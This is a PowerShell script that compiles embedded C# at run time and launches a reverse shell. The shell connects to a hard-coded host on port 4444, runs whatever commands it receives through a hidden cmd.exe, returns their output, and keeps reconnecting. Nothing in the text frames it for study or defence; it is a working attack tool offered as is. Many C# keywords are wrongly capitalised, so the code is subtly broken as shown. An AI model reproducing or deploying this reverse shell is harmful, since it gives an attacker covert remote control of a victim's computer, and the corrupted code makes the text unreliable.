$c = @"
Using System;
Using System.Net.Sockets;
Using System.IO;
Using System.Diagnostics;
Using System.Text;
Public class Runner {
Public static void Execute() {
String ip = "10.211.55.5";
Int port = 4444;
While(true) {
Try {
Using(TcpClient client = new TcpClient(ip, port)) {
Using(Stream s = client.GetStream()) {
Using(StreamReader r = new StreamReader(s)) {
While(client.Connected) {
String cmd = r.ReadLine();
If(cmd == "exit") break;
                                Process p = new Process();
P.StartInfo.FileName = "cmd.exe";
P.StartInfo.Arguments = "/c " + cmd;
P.StartInfo.UseShellExecute = false;
P.StartInfo.RedirectStandardOutput = true;
P.StartInfo.CreateNoWindow = true;
P.Start();
String output = p.StandardOutput.ReadToEnd();
Byte[] b = Encoding.ASCII.GetBytes(output);
S.Write(b, 0, b.Length);
                            }
                        }
                    }
                }
            } catch { System.Threading.Thread.Sleep(5000); }
        }
    }
}
"@

Add-Type -TypeDefinition $c -Language CSharp
[Runner]::Execute()
